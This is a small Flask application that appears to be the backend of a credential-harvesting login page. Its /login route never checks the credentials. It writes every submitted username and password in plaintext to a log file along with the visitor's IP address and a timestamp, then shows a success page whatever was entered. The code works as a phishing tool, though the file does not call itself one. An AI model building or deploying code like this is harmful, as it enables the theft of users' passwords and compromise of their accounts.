from flask import Flask, render_template, request, redirect
import datetime
import os
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    # Clear the terminal screen
    os.system('clear')  # for Linux/MacOS, 'cls' for Windows
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Get real IP address
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Save to log file
    with open('log.txt', 'a') as f:
        f.write(f"[{datetime.datetime.now()}] IP: {user_ip} | Username: {username} | Password: {password}\n")

    # Echo message in terminal
    subprocess.run(["echo", f"User {username} attempted login with IP: {user_ip}"])

    return render_template('success.html', username=username)

if __name__ == '__main__':
    app.run(debug=True)
